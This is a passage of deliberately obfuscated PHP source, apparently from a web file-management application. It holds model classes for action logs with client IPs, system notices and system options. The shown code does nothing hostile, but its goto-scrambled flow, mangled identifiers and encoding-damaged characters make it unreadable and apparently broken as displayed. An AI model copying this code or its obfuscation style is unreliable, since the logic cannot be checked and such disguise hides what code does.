array($a©²šÜì˜Ñ[2082] => array($a©²šÜì˜Ñ[2083]), $a©²šÜì˜Ñ[2403] => array($a©²šÜì˜Ñ[2458]), $a©²šÜì˜Ñ[2405] => array($a©²šÜì˜Ñ[2459]), $a©²šÜì˜Ñ[2075] => array($a©²šÜì˜Ñ[2076]), $a©²šÜì˜Ñ[2411] => array(), $a©²šÜì˜Ñ[2413] => array(), $a©²šÜì˜Ñ[2415] => array(), $a©²šÜì˜Ñ[2085] => array($a©²šÜì˜Ñ[2087]), $a©²šÜì˜Ñ[2086] => array($a©²šÜì˜Ñ[2087]), $a©²šÜì˜Ñ[2419] => array($a©²šÜì˜Ñ[2460]), $a©²šÜì˜Ñ[2421] => array($a©²šÜì˜Ñ[2460]), $a©²šÜì˜Ñ[2423] => array($a©²šÜì˜Ñ[2461]), $a©²šÜì˜Ñ[2409] => array($a©²šÜì˜Ñ[2462]), $a©²šÜì˜Ñ[2080] => array($a©²šÜì˜Ñ[2463]), $a©²šÜì˜Ñ[2426] => array($a©²šÜì˜Ñ[2464]), $a©²šÜì˜Ñ[2079] => array($a©²šÜì˜Ñ[2081])); return $C»‹Ù‹÷¿”; } private function typeAll() { goto D“™ÙÖœˆŠ; bËÜ„³…‡: foreach ($f™›¤†Û as $ešÈªÂ“ù => $CšÀö®º¾–) { $Fóç¾¥Ï¬ô[$CšÀö®º¾–[0]] = $Fóç¾¥Ï¬ô[$ešÈªÂ“ù]; } $Fóç¾¥Ï¬ô[$A®µ‰ÎëªÇ[2087]] = LNG($A®µ‰ÎëªÇ[2465]); $Fóç¾¥Ï¬ô[$A®µ‰ÎëªÇ[2460]] = LNG($A®µ‰ÎëªÇ[2466]); goto A¹ÇÓÕ£˜ë; A¹ÇÓÕ£˜ë: return $Fóç¾¥Ï¬ô; goto dºë½ˆÔ¯Ë; D“™ÙÖœˆŠ: $A®µ‰ÎëªÇ =& $_SERVER[‚Ğ°–—î]; $Fóç¾¥Ï¬ô = $this->typeList; $f™›¤†Û = array_filter($this->typeFile()); goto bËÜ„³…‡; dºë½ˆÔ¯Ë: } public function addLog($dï±‡·Ï´, $A”Å–šõš• = array()) { goto Eê‰Ş•¶‹©; BªÌ§–•‹: $aªÊ¦Ó˜Ùƒ = get_client_ip(); if (!$A”Å–šõš• || strlen(json_encode($A”Å–šõš•)) >= 1024) { $A”Å–šõš• = array($CÂÖ‘Çâí[2467] => $aªÊ¦Ó˜Ùƒ); } else { if (is_array($A”Å–šõš•)) { $A”Å–šõš•[$CÂÖ‘Çâí[2467]] = $aªÊ¦Ó˜Ùƒ; } else { $A”Å–šõš• = array($CÂÖ‘Çâí[1035] => $A”Å–šõš•, $CÂÖ‘Çâí[2467] => $aªÊ¦Ó˜Ùƒ); } } $A”Å–šõš• = array($CÂÖ‘Çâí[1428] => Session::sign(), $CÂÖ‘Çâí[1429] => $F„æÖ‘É†Í, $CÂÖ‘Çâí[29] => $dï±‡·Ï´, $CÂÖ‘Çâí[1431] => json_encode($A”Å–šõš•)); goto F ¡¹ºÓ–¾; F ¡¹ºÓ–¾: parent::add($A”Å–šõš•); goto f½ö×Å«±; Eê‰Ş•¶‹©: $CÂÖ‘Çâí =& $_SERVER[‚Ğ°–—î]; if (!isset($this->typeList[$dï±‡·Ï´])) { return; } $F„æÖ‘É†Í = USER_ID ? USER_ID : (isset($A”Å–šõš•[$CÂÖ‘Çâí[1438]]) ? $A”Å–šõš•[$CÂÖ‘Çâí[1438]] : 0); goto BªÌ§–•‹; f½ö×Å«±: } public function remove($a±¸£¬‹ÂÓ) { $this->where(array($_SERVER[‚Ğ°–—î][385] => $a±¸£¬‹ÂÓ))->delete(); } private function _makeOrder($cÈ…Œ·œŸ¥ = '') { goto CáÑÊÂŒ²–; CáÑÊÂŒ²–: $fœ¿ ÆÅØ­ =& $_SERVER[‚Ğ°–—î]; $e±ù˜Š¸Í = $fœ¿ ÆÅØ­[187]; $bÉ¡Ùå’“• = array($fœ¿ ÆÅØ­[402] => $fœ¿ ÆÅØ­[403], $fœ¿ ÆÅØ­[404] => $fœ¿ ÆÅØ­[405]); goto cßÔ§ÁÄÂµ; cßÔ§ÁÄÂµ: $EÔïÓ±Üãç = Input::get($fœ¿ ÆÅØ­[408], $fœ¿ ÆÅØ­[7], $fœ¿ ÆÅØ­[2245], array($fœ¿ ÆÅØ­[2182], $fœ¿ ÆÅØ­[404])); $EÔïÓ±Üãç = $bÉ¡Ùå’“•[$EÔïÓ±Üãç]; $cÈ…Œ·œŸ¥ = $cÈ…Œ·œŸ¥ . "{$e±ù˜Š¸Í}\40{$EÔïÓ±Üãç}"; goto BËï¾”¤º½; BËï¾”¤º½: return $this->order($cÈ…Œ·œŸ¥); goto E×…»Î°Ú¨; E×…»Î°Ú¨: } public function get($fùİš¯˜Şß = '') { goto E¦­Şö×å¢; aÄÏ¯˜ö·œ: if (!empty($fùİš¯˜Şß[$F’ï“İÉ£[2467]])) { $CÄƒĞ˜ÆôÅ[$F’ï“İÉ£[405]] = array($F’ï“İÉ£[751], "\x25{$fùİš¯˜Şß[$F’ï“İÉ£[2467]]}\45"); } $EŠ™â”É¾‰ = $this->_makeOrder()->where($CÄƒĞ˜ÆôÅ)->selectPage(); if (empty($EŠ™â”É¾‰[$F’ï“İÉ£[354]])) { show_json(array(), !0, $EŠ™â”É¾‰[$F’ï“İÉ£[351]]); } goto d¬ÁŒÕø ·; d¬ÁŒÕø ·: $EŠ™â”É¾‰[$F’ï“İÉ£[354]] = $this->logList($EŠ™â”É¾‰[$F’ï“İÉ£[354]]); return $EŠ™â”É¾‰; goto e¡à‹Ñá‚Ú; B÷ˆ¶Õ‹”Õ: if ($fùİš¯˜Şß[$F’ï“İÉ£[1438]]) { $CÄƒĞ˜ÆôÅ[$F’ï“İÉ£[1438]] = $fùİš¯˜Şß[$F’ï“İÉ£[1438]]; } if (isset($fùİš¯˜Şß[$F’ï“İÉ£[701]])) { $A°é³É‹ = $fùİš¯˜Şß[$F’ï“İÉ£[701]]; $cğ¨­Ä¨ = isset($fùİš¯˜Şß[$F’ï“İÉ£[702]]) ? $fùİš¯˜Şß[$F’ï“İÉ£[702]] : time(); $CÄƒĞ˜ÆôÅ[$F’ï“İÉ£[187]] = array($F’ï“İÉ£[321], array($A°é³É‹, $cğ¨­Ä¨)); } if ($fùİš¯˜Şß[$F’ï“İÉ£[29]]) { $c°–è±Š¿ = explode($F’ï“İÉ£[47], $fùİš¯˜Şß[$F’ï“İÉ£[29]]); $EÂƒïğ…ÚÀ = $this->typeFile(); $Bô½¹‹¨‘Ò = array(); foreach ($c°–è±Š¿ as $A¡®ªÅøÏ¹) { $Bô½¹‹¨‘Ò[] = $A¡®ªÅøÏ¹; if (isset($EÂƒïğ…ÚÀ[$A¡®ªÅøÏ¹])) { $Bô½¹‹¨‘Ò = array_merge($Bô½¹‹¨‘Ò, $EÂƒïğ…ÚÀ[$A¡®ªÅøÏ¹]); } } $Bô½¹‹¨‘Ò = array_unique($Bô½¹‹¨‘Ò); if ($Bô½¹‹¨‘Ò) { $CÄƒĞ˜ÆôÅ[$F’ï“İÉ£[29]] = array($F’ï“İÉ£[7], $Bô½¹‹¨‘Ò); } } goto aÄÏ¯˜ö·œ; E¦­Şö×å¢: $F’ï“İÉ£ =& $_SERVER[‚Ğ°–—î]; if (!$fùİš¯˜Şß) { show_json(array()); } $CÄƒĞ˜ÆôÅ = array(); goto B÷ˆ¶Õ‹”Õ; e¡à‹Ñá‚Ú: } private function ipAddress(&$D´Ò¾˜§) { $Aô˜îË˜»ç =& $_SERVER[‚Ğ°–—î]; if (!empty($D´Ò¾˜§[$Aô˜îË˜»ç[2467]])) { $DÒ°›†·ëÔ = IpLocation::get($D´Ò¾˜§[$Aô˜îË˜»ç[2467]]); } else { $DÒ°›†·ëÔ = LNG($Aô˜îË˜»ç[2468]); } $D´Ò¾˜§[$Aô˜îË˜»ç[2469]] = $DÒ°›†·ëÔ; } private function descZipDownload($cÌÑâ“ˆ—, &$Aí¥»˜¡ìÏ) { $CøŞ«ò½È¦ =& $_SERVER[‚Ğ°–—î]; if (!isset($cÌÑâ“ˆ—[$CøŞ«ò½È¦[2470]])) { return; } $Bà‘™Ì•¸Œ = json_decode($cÌÑâ“ˆ—[$CøŞ«ò½È¦[2470]], !0); foreach ($Bà‘™Ì•¸Œ as $B¼Ö¯Á¥…Ü) { if (!IO::init($B¼Ö¯Á¥…Ü[$CøŞ«ò½È¦[75]])) { continue; } if (!($bö¯“õÙô = IO::infoFull($B¼Ö¯Á¥…Ü[$CøŞ«ò½È¦[75]]))) { continue; } $cÌÑâ“ˆ—[$CøŞ«ò½È¦[75]] = $B¼Ö¯Á¥…Ü[$CøŞ«ò½È¦[75]]; $Aí¥»˜¡ìÏ[] = $cÌÑâ“ˆ—[$CøŞ«ò½È¦[369]] = $bö¯“õÙô[$CøŞ«ò½È¦[369]]; $Aí¥»˜¡ìÏ[] = $cÌÑâ“ˆ—[$CøŞ«ò½È¦[2288]] = $bö¯“õÙô[$CøŞ«ò½È¦[461]]; break; } return $cÌÑâ“ˆ—; } private function getSourceList(&$aªñ­ò“Ï…) { $eØšĞò¶“ =& $_SERVER[‚Ğ°–—î]; $DÛÂ±ñ¾ÉÜ = array(); foreach ($aªñ­ò“Ï… as $a”ŞøØ¼¹« => $fÆê…„ŸÍ‡) { goto A“í‡‡â¹©; aö±Â•Öé¯: $DÛÂ±ñ¾ÉÜ[] = $dÏßŠë¯öÇ[$eØšĞò¶“[369]]; $DÛÂ±ñ¾ÉÜ[] = $dÏßŠë¯öÇ[$eØšĞò¶“[2288]]; if ($dÏßŠë¯öÇ[$eØšĞò¶“[29]] == $eØšĞò¶“[492]) { $DÛÂ±ñ¾ÉÜ[] = $dÏßŠë¯öÇ[$eØšĞò¶“[405]][$eØšĞò¶“[1008]]; $DÛÂ±ñ¾ÉÜ[] = $dÏßŠë¯öÇ[$eØšĞò¶“[405]][$eØšĞò¶“[1009]]; } goto Dƒ œÜË©; A“í‡‡â¹©: $dÏßŠë¯öÇ = json_decode($fÆê…„ŸÍ‡[$eØšĞò¶“[405]], !0); if ($fÆê…„ŸÍ‡[$eØšĞò¶“[29]] == $eØšĞò¶“[2078]) { $dÏßŠë¯öÇ = $this->descZipDownload($dÏßŠë¯öÇ, $DÛÂ±ñ¾ÉÜ); $aªñ­ò“Ï…[$a”ŞøØ¼¹«][$eØšĞò¶“[405]] = json_encode($dÏßŠë¯öÇ); continue; } if (strpos($fÆê…„ŸÍ‡[$eØšĞò¶“[29]], $eØšĞò¶“[2289]) !== 0) { goto Eí ®…ÖéÂ; Eí ®…ÖéÂ: if (!isset($dÏßŠë¯öÇ[$eØšĞò¶“[75]]) || strpos($fÆê…„ŸÍ‡[$eØšĞò¶“[29]], $eØšĞò¶“[2471]) !== 0) { continue; } if (!IO::init($dÏßŠë¯öÇ[$eØšĞò¶“[75]])) { continue; } if (!($Få·ÏÓ¼¾ = IO::infoFull($dÏßŠë¯öÇ[$eØšĞò¶“[75]]))) { continue; } goto Aë‹¼ƒèğÛ; Aë‹¼ƒèğÛ: $DÛÂ±ñ¾ÉÜ[] = $dÏßŠë¯öÇ[$eØšĞò¶“[369]] = $Få·ÏÓ¼¾[$eØšĞò¶“[369]]; $DÛÂ±ñ¾ÉÜ[] = $dÏßŠë¯öÇ[$eØšĞò¶“[2288]] = $Få·ÏÓ¼¾[$eØšĞò¶“[461]]; $aªñ­ò“Ï…[$a”ŞøØ¼¹«][$eØšĞò¶“[405]] = json_encode($dÏßŠë¯öÇ); goto eœÍ†Æˆœ®; eœÍ†Æˆœ®: continue; goto c¬‚îñ»öŠ; c¬‚îñ»öŠ: } goto aö±Â•Öé¯; Dƒ œÜË©: if ($dÏßŠë¯öÇ[$eØšĞò¶“[29]] == $eØšĞò¶“[2296]) { $DÛÂ±ñ¾ÉÜ[] = $dÏßŠë¯öÇ[$eØšĞò¶“[405]][$eØšĞò¶“[369]]; } goto d†ÜÜ¥ õÍ; d†ÜÜ¥ õÍ: } if (!$DÛÂ±ñ¾ÉÜ) { return array(); } return Model($eØšĞò¶“[752])->sourceListInfo($DÛÂ±ñ¾ÉÜ, !0); } private function logList($bÛäØŞ‹‚ç) { goto B„¢êõ†; Eè»‡Øôœİ: return $b‚¿˜”ˆ¢; goto B“Ä®îÓ£ƒ; B„¢êõ†: $CÏ…µõ¿‰ô =& $_SERVER[‚Ğ°–—î]; $EÊË”ëèÈš = array_to_keyvalue($bÛäØŞ‹‚ç, $CÏ…µõ¿‰ô[33], $CÏ…µõ¿‰ô[1438]); $E¹ÅòÚ÷·ô = Model($CÏ…µõ¿‰ô[477])->userListInfo(array_unique($EÊË”ëèÈš)); goto dé–èÕİ°Ç; dé–èÕİ°Ç: $b¶Æ®ÓÊô = $this->getSourceList($bÛäØŞ‹‚ç); $E®ê†©êæœ = $this->typeAll(); $b‚¿˜”ˆ¢ = array(); goto eÓµŠ÷’¥ ; eÓµŠ÷’¥ : $F÷ã¡‰”© = array(); foreach ($bÛäØŞ‹‚ç as $e›ãÛÚ½ˆ„ => $FéŠ–ê—Á) { goto F”Ë‚é‡àí; C‘†´‹¤ŒÕ: $FéŠ–ê—Á[$CÏ…µõ¿‰ô[2244]] = $f‹çÃ÷»÷; $AŒ†ŞÙ³îç = json_decode($FéŠ–ê—Á[$CÏ…µõ¿‰ô[405]], !0); $FéŠ–ê—Á[$CÏ…µõ¿‰ô[2467]] = isset($AŒ†ŞÙ³îç[$CÏ…µõ¿‰ô[2467]]) ? $AŒ†ŞÙ³îç[$CÏ…µõ¿‰ô[2467]] : $CÏ…µõ¿‰ô[33]; goto Có®ï¼ÍÜ“; b½½ôŒƒëæ: $FéŠ–ê—Á[$CÏ…µõ¿‰ô[28]] = isset($f‹çÃ÷»÷[$CÏ…µõ¿‰ô[28]]) ? $f‹çÃ÷»÷[$CÏ…µõ¿‰ô[28]] : LNG($CÏ…µõ¿‰ô[2468]); $FéŠ–ê—Á[$CÏ…µõ¿‰ô[2336]] = isset($f‹çÃ÷»÷[$CÏ…µõ¿‰ô[2336]]) ? $f‹çÃ÷»÷[$CÏ…µõ¿‰ô[2336]] : $CÏ…µõ¿‰ô[33]; $FéŠ–ê—Á[$CÏ…µõ¿‰ô[1344]] = isset($E®ê†©êæœ[$Aïì£ŠÆÅ¶]) ? $E®ê†©êæœ[$Aïì£ŠÆÅ¶] : $dÛÄÀ’ ; goto C‘†´‹¤ŒÕ; F”Ë‚é‡àí: $Aïì£ŠÆÅ¶ = $FéŠ–ê—Á[$CÏ…µõ¿‰ô[29]]; $f‹çÃ÷»÷ = isset($E¹ÅòÚ÷·ô[$FéŠ–ê—Á[$CÏ…µõ¿‰ô[1438]]]) ? $E¹ÅòÚ÷·ô[$FéŠ–ê—Á[$CÏ…µõ¿‰ô[1438]]] : !1; $dÛÄÀ’  = strpos($Aïì£ŠÆÅ¶, $CÏ…µõ¿‰ô[2472]) === 0 ? LNG($CÏ…µõ¿‰ô[2473]) : LNG($CÏ…µõ¿‰ô[2468]); goto b½½ôŒƒëæ; A‹›èİÄÊ: unset($FéŠ–ê—Á[$CÏ…µõ¿‰ô[2474]]); $b‚¿˜”ˆ¢[] = $FéŠ–ê—Á; goto D÷ù«©ÚÌÀ; Có®ï¼ÍÜ“: $this->ipAddress($FéŠ–ê—Á); if (strpos($Aïì£ŠÆÅ¶, $CÏ…µõ¿‰ô[2289]) === 0 || isset($AŒ†ŞÙ³îç[$CÏ…µõ¿‰ô[2288]])) { goto AË­ºîÚ¼Â; AË­ºîÚ¼Â: $AŒ†ŞÙ³îç[$CÏ…µõ¿‰ô[391]] = $b¶Æ®ÓÊô[$AŒ†ŞÙ³îç[$CÏ…µõ¿‰ô[369]]]; $AŒ†ŞÙ³îç[$CÏ…µõ¿‰ô[2301]] = $b¶Æ®ÓÊô[$AŒ†ŞÙ³îç[$CÏ…µõ¿‰ô[2288]]]; if ($AŒ†ŞÙ³îç[$CÏ…µõ¿‰ô[29]] == $CÏ…µõ¿‰ô[492]) { $AŒ†ŞÙ³îç[$CÏ…µõ¿‰ô[405]][$CÏ…µõ¿‰ô[1008]] = $b¶Æ®ÓÊô[$AŒ†ŞÙ³îç[$CÏ…µõ¿‰ô[405]][$CÏ…µõ¿‰ô[1008]]]; $AŒ†ŞÙ³îç[$CÏ…µõ¿‰ô[405]][$CÏ…µõ¿‰ô[1009]] = $b¶Æ®ÓÊô[$AŒ†ŞÙ³îç[$CÏ…µõ¿‰ô[405]][$CÏ…µõ¿‰ô[1009]]]; } goto D’ñÀ¥©; aˆà‚ÍòÖ…: if ($AŒ†ŞÙ³îç[$CÏ…µõ¿‰ô[2301]] && $AŒ†ŞÙ³îç[$CÏ…µõ¿‰ô[2301]][$CÏ…µõ¿‰ô[371]] == $CÏ…µõ¿‰ô[1081]) { $F÷ã¡‰”©[] = $FéŠ–ê—Á[$CÏ…µõ¿‰ô[367]]; unset($bÛäØŞ‹‚ç[$e›ãÛÚ½ˆ„]); continue; } goto F½×ë‹×ÕÍ; D’ñÀ¥©: if ($AŒ†ŞÙ³îç[$CÏ…µõ¿‰ô[29]] == $CÏ…µõ¿‰ô[2296]) { $AŒ†ŞÙ³îç[$CÏ…µõ¿‰ô[405]][$CÏ…µõ¿‰ô[369]] = $b¶Æ®ÓÊô[$AŒ†ŞÙ³îç[$CÏ…µõ¿‰ô[405]][$CÏ…µõ¿‰ô[369]]]; } if ($AŒ†ŞÙ³îç[$CÏ…µõ¿‰ô[29]] == $CÏ…µõ¿‰ô[2073]) { $AŒ†ŞÙ³îç[$CÏ…µõ¿‰ô[2301]] = $AŒ†ŞÙ³îç[$CÏ…µõ¿‰ô[391]]; $AŒ†ŞÙ³îç[$CÏ…µõ¿‰ô[2288]] = $AŒ†ŞÙ³îç[$CÏ…µõ¿‰ô[2301]][$CÏ…µõ¿‰ô[369]]; $AŒ†ŞÙ³îç[$CÏ…µõ¿‰ô[391]] = !1; $AŒ†ŞÙ³îç[$CÏ…µõ¿‰ô[369]] = $CÏ…µõ¿‰ô[33]; } if ($AŒ†ŞÙ³îç[$CÏ…µõ¿‰ô[391]] && $AŒ†ŞÙ³îç[$CÏ…µõ¿‰ô[391]][$CÏ…µõ¿‰ô[371]] == $CÏ…µõ¿‰ô[1081]) { $F÷ã¡‰”©[] = $FéŠ–ê—Á[$CÏ…µõ¿‰ô[367]]; unset($bÛäØŞ‹‚ç[$e›ãÛÚ½ˆ„]); continue; } goto aˆà‚ÍòÖ…; F½×ë‹×ÕÍ: } $FéŠ–ê—Á[$CÏ…µõ¿‰ô[405]] = $AŒ†ŞÙ³îç; goto A‹›èİÄÊ; D÷ù«©ÚÌÀ: } $this->clearSystemPathLog($F÷ã¡‰”©); goto Eè»‡Øôœİ; B“Ä®îÓ£ƒ: } private function clearSystemPathLog($Fó®à—²è×) { $bˆÚÔÕå±‰ =& $_SERVER[‚Ğ°–—î]; if (count($Fó®à—²è×) == 0) { return; } $cùØùÁÇá› = array($bˆÚÔÕå±‰[367] => array($bˆÚÔÕå±‰[7], array_unique($Fó®à—²è×))); $this->where($cùØùÁÇá›)->delete(); } public function deviceList($EÀ­Îç¦ÅŠ, $fº„‹‘ï×Ü = 0) { $eóœ’İ‡—Ç =& $_SERVER[‚Ğ°–—î]; $f¸Ï¨éÊã– = array($eóœ’İ‡—Ç[1438] => $EÀ­Îç¦ÅŠ, $eóœ’İ‡—Ç[187] => array($eóœ’İ‡—Ç[929], $fº„‹‘ï×Ü), $eóœ’İ‡—Ç[29] => $eóœ’İ‡—Ç[2046]); $F³Ñ†„‡›œ = array(); $eÒèÍÇ©²ƒ = $this->field($eóœ’İ‡—Ç[2475])->where($f¸Ï¨éÊã–)->order($eóœ’İ‡—Ç[2299])->limit(50)->select(); foreach ($eÒèÍÇ©²ƒ as $FÉê‘´í²Ó => $B©ã¤ÖÓ›†) { goto c¹ëÚ©ÚËó; cÓÜ‰¤Áíá: unset($D»­É°‡˜ [$eóœ’İ‡—Ç[2467]]); $B½œ¢É²Úš = $this->deviceType($D»­É°‡˜ [$eóœ’İ‡—Ç[2290]]); if (isset($F³Ñ†„‡›œ[$B½œ¢É²Úš])) { continue; } goto E¬¬•Š†÷; E¬¬•Š†÷: $this->ipAddress($B©ã¤ÖÓ›†); $B©ã¤ÖÓ›†[$eóœ’İ‡—Ç[405]] = $D»­É°‡˜ ; $F³Ñ†„‡›œ[$B½œ¢É²Úš] = $B©ã¤ÖÓ›†; goto cò…Ö†²¾; c¹ëÚ©ÚËó: if ($FÉê‘´í²Ó > 0 && abs($B©ã¤ÖÓ›†[$eóœ’İ‡—Ç[187]] - $eÒèÍÇ©²ƒ[$FÉê‘´í²Ó - 1][$eóœ’İ‡—Ç[187]]) < 5) { continue; } $D»­É°‡˜  = json_decode($B©ã¤ÖÓ›†[$eóœ’İ‡—Ç[405]], !0); $B©ã¤ÖÓ›†[$eóœ’İ‡—Ç[2467]] = isset($D»­É°‡˜ [$eóœ’İ‡—Ç[2467]]) ? $D»­É°‡˜ [$eóœ’İ‡—Ç[2467]] : $eóœ’İ‡—Ç[33]; goto cÓÜ‰¤Áíá; cò…Ö†²¾: } return array_values($F³Ñ†„‡›œ); } public function deviceType($B¥Ñâ½Å­•) { return $B¥Ñâ½Å­•; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\155\56\x6e\157\x74\x69\143\145\x4c\151\163\164"; public $field = array("\x6e\x61\155\x65", "\x63\x6f\156\x74\x65\x6e\164", "\141\x75\164\150", "\155\157\x64\x65", "\x74\151\155\145", "\164\171\x70\x65", "\154\x65\x76\x65\x6c", "\x65\156\x61\x62\x6c\145", "\163\x6f\x72\164"); public function listData($f¾¤ İ¼ › = false, $FÂŠˆ‹Èë = "\163\157\162\x74", $bçõ‘ÑÑ… = false) { return parent::listData($f¾¤ İ¼ ›, $FÂŠˆ‹Èë, $bçõ‘ÑÑ…); } public function add($f™ˆËÆ‹ÏÇ) { $aÕ“Ü‘ Â³ =& $_SERVER[‚Ğ°–—î]; $D‚šÈ²ÅŸ = time(); if ($f™ˆËÆ‹ÏÇ[$aÕ“Ü‘ Â³[12]] == $aÕ“Ü‘ Â³[2476]) { $D‚šÈ²ÅŸ = strtotime($f™ˆËÆ‹ÏÇ[$aÕ“Ü‘ Â³[190]]); } $f™ˆËÆ‹ÏÇ[$aÕ“Ü‘ Â³[190]] = $D‚šÈ²ÅŸ; return parent::insert($f™ˆËÆ‹ÏÇ); } public function update($c‘ÇõÛó£, $eÁ¦ÓÓğÏ«) { goto E½²Œİ‹; Fíæî¨ç´ğ: return parent::update($c‘ÇõÛó£, $eÁ¦ÓÓğÏ«); goto fªó¢ê¾; DæÏà¦òá…: $d½…äì¾ôÀ = time(); if ($eÁ¦ÓÓğÏ«[$bäÎº³‹ªÚ[12]] == $bäÎº³‹ªÚ[2476]) { $d½…äì¾ôÀ = strtotime($eÁ¦ÓÓğÏ«[$bäÎº³‹ªÚ[190]]); } $eÁ¦ÓÓğÏ«[$bäÎº³‹ªÚ[190]] = $d½…äì¾ôÀ; goto Fíæî¨ç´ğ; E½²Œİ‹: $bäÎº³‹ªÚ =& $_SERVER[‚Ğ°–—î]; $bØíğŠ´Ö = $this->listData($c‘ÇõÛó£); if (!$bØíğŠ´Ö) { return !1; } goto DæÏà¦òá…; fªó¢ê¾: } public function remove($dŠ„ÑÇ¯Ù) { $Eº¾‚§šÜ« = $this->listData($dŠ„ÑÇ¯Ù); if (!$Eº¾‚§šÜ« || $Eº¾‚§šÜ«[$_SERVER[‚Ğ°–—î][1081]]) { return !1; } return parent::remove($dŠ„ÑÇ¯Ù); } public function sort($b¨º¿ç™õ, $e¨£Üˆááƒ) { return parent::update($b¨º¿ç™õ, $e¨£Üˆááƒ); } public function enable($CÔÚ‘ƒ‡åæ, $FšÂÀØ“ôÙ) { return parent::update($CÔÚ‘ƒ‡åæ, array($_SERVER[‚Ğ°–—î][2477] => $FšÂÀØ“ôÙ)); } private function initUserOption() { $aÙ™Ö¼ãŠÁ =& $_SERVER[‚Ğ°–—î]; $this->optionType = $aÙ™Ö¼ãŠÁ[2478]; $this->modelType = $aÙ™Ö¼ãŠÁ[2479]; $this->field = array($aÙ™Ö¼ãŠÁ[2480], $aÙ™Ö¼ãŠÁ[28], $aÙ™Ö¼ãŠÁ[190], $aÙ™Ö¼ãŠÁ[29], $aÙ™Ö¼ãŠÁ[2481], $aÙ™Ö¼ãŠÁ[688], $aÙ™Ö¼ãŠÁ[183]); } public function userNoticeGet($eêÕˆ—… = false) { $this->initUserOption(); return parent::listData($eêÕˆ—…, $_SERVER[‚Ğ°–—î][367], !0); } public function userNoticeAdd($eºÍ¬‡Ş‰—) { $D‡Ã†æ‚ë‡ =& $_SERVER[‚Ğ°–—î]; $this->initUserOption(); $e†•íŒÆî™ = $this->findByKey($D‡Ã†æ‚ë‡[2480], $eºÍ¬‡Ş‰—[$D‡Ã†æ‚ë‡[367]]); if ($e†•íŒÆî™) { return !0; } $AÇ‘¿›Ş‚ = array($D‡Ã†æ‚ë‡[2480] => $eºÍ¬‡Ş‰—[$D‡Ã†æ‚ë‡[367]], $D‡Ã†æ‚ë‡[28] => $eºÍ¬‡Ş‰—[$D‡Ã†æ‚ë‡[28]], $D‡Ã†æ‚ë‡[190] => $eºÍ¬‡Ş‰—[$D‡Ã†æ‚ë‡[190]], $D‡Ã†æ‚ë‡[29] => isset($eºÍ¬‡Ş‰—[$D‡Ã†æ‚ë‡[29]]) ? $eºÍ¬‡Ş‰—[$D‡Ã†æ‚ë‡[29]] : 1, $D‡Ã†æ‚ë‡[2481] => isset($eºÍ¬‡Ş‰—[$D‡Ã†æ‚ë‡[2481]]) ? $eºÍ¬‡Ş‰—[$D‡Ã†æ‚ë‡[2481]] : 0, $D‡Ã†æ‚ë‡[688] => 0, $D‡Ã†æ‚ë‡[183] => 0); return parent::insert($AÇ‘¿›Ş‚); } public function userNoticeEdit($DéŸ¡‚Ù‡é, $fÆ³îãŠùœ) { $this->initUserOption(); return parent::update($DéŸ¡‚Ù‡é, $fÆ³îãŠùœ); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\163\x74\x65\x6d\x5f\x6f\160\164\151\157\156"; protected $jsonField = array("\x6d\145\156\165", "\x72\157\x6c\x65", "\x72\x6f\x6c\145\x47\162\157\165\x70", "\x72\x65\x67\151\x73\x74", "\x65\155\x61\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($aº‚À»‚Éò) { return "\x53\171\163\x74\145\155\x4f\160\164\151\157\x6e\x5f{$aº‚À»‚Éò}"; } protected function optionDefault($F±Â•…°ò = '') { $D—İÕ¤¯¨ =& $_SERVER[‚Ğ°–—î]; if ($F±Â•…°ò == $D—İÕ¤¯¨[33]) { return $GLOBALS[$D—İÕ¤¯¨[6]][$D—İÕ¤¯¨[2482]]; } } } goto e°ÒÜîåÑ½; c›ÇÖŞÀï”: function beforeShutdown() { Hook::trigger($_SERVER[ú][36]); } $_SERVER[$_SERVER[ú][37]] = BASIC_PATH; $_SERVER[$_SERVER[ú][38]] = LIB_DIR; goto B±À—Ä±½; Cëã¸øàì: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\x64\x69\x66\x79\x54\x69\x6d\145", "\x74\x69\155\x65", "\x69\x6e\163\x65\x72\x74\54\165\160\x64\141\164\x65", "\x66\x75\156\x63\164\151\x6f\x6e"), array("\143\x72\145\141\x74\x65\124\151\155\x65", "\164\151\x6d\x65", "\151\x6e\x73\x65\162\x74", "\146\165\x6e\x63\164\x69\x6f\x6e")); public function setDataAuto($cé¬ë®ˆ¸¹) { $this->dataAuto = $cé¬ë®ˆ¸¹; } public function __construct($bÆÖ¿¹…ƒ = '', $dÙ¡Êã»Ç¼ = '', $fÜâå¿›¿Ö = '') { parent::__construct($bÆÖ¿¹…ƒ, $dÙ¡Êã»Ç¼, $fÜâå¿›¿Ö); } public static function textEncode($BŒŠáœßÚÛ) { if (!$BŒŠáœßÚÛ) { return $BŒŠáœßÚÛ; } $cŒ–ŞÍËš = json_encode($BŒŠáœßÚÛ); $cŒ–ŞÍËš = preg_replace_callback($_SERVER[‚Ğ°–—î][342], function ($C…ä²é¯) { return addslashes($C…ä²é¯[0]); }, $cŒ–ŞÍËš); return json_decode($cŒ–ŞÍËš); } public static function textDecode($fƒË˜„­Úô) { $DÌÈ‹’ =& $_SERVER[‚Ğ°–—î]; $EîÑ Ù¸Ü“ = json_encode($fƒË˜„­Úô); $EîÑ Ù¸Ü“ = preg_replace_callback($DÌÈ‹’[343], function ($A…®—Éª–ƒ) { return $_SERVER[‚Ğ°–—î][93]; }, $EîÑ Ù¸Ü“); return json_decode($EîÑ Ù¸Ü“); } protected $tableMeta = array(); protected function _beforeInsert(&$A¨†ªá×¢¾, $eøçŠ—‹¢ó) { $FÜ³ÀÂ˜ =& $_SERVER[‚Ğ°–—î]; if (!$this->checkDataAutoHas($FÜ³ÀÂ˜[344])) { return; } $this->dataBeforeFilter($A¨†ªá×¢¾, $FÜ³ÀÂ˜[344]); } protected function _beforeUpdate(&$aá‹¥ŞÌ½Ø, $f³¯õäï) { $FŠĞ·‚áÎÓ =& $_SERVER[‚Ğ°–—î]; if (!$this->checkDataAutoHas($FŠĞ·‚áÎÓ[345])) { return; } $this->dataBeforeFilter($aá‹¥ŞÌ½Ø, $FŠĞ·‚áÎÓ[345]); } protected function _afterSelect(&$a§‹ìÔ­†, $F‰¼¶šÖÛ) { if (!is_array($a§‹ìÔ­†)) { return; } if (!$this->checkDataAutoHas($_SERVER[‚Ğ°–—î][346])) { return; } foreach ($a§‹ìÔ­† as 